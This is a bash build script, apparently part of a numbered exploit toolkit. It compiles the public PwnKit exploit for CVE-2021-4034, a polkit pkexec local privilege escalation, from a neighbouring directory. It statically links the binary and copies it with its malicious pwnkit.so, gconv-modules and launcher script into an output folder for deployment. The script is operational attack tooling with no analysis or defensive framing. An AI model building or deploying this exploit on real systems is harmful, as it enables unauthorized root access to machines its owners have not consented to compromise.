#!/usr/bin/env bash
# 03pwnkit — CVE-2021-4034 polkit pkexec 越权写
# 用法: build.sh <outdir> [gnu|musl]
set -euo pipefail
OUT="${1:?usage: build.sh <outdir> [gnu|musl]}"
cd "$(dirname "$0")/CVE-2021-4034"
mkdir -p "$OUT"
make clean >/dev/null 2>&1 || true
make LDFLAGS=-static CC="${CC:-gcc}"
cp -f cve-2021-4034 pwnkit.so gconv-modules cve-2021-4034.sh "$OUT/" 2>/dev/null || true
echo "[03pwnkit] -> $OUT/{cve-2021-4034,pwnkit.so,gconv-modules,cve-2021-4034.sh}"
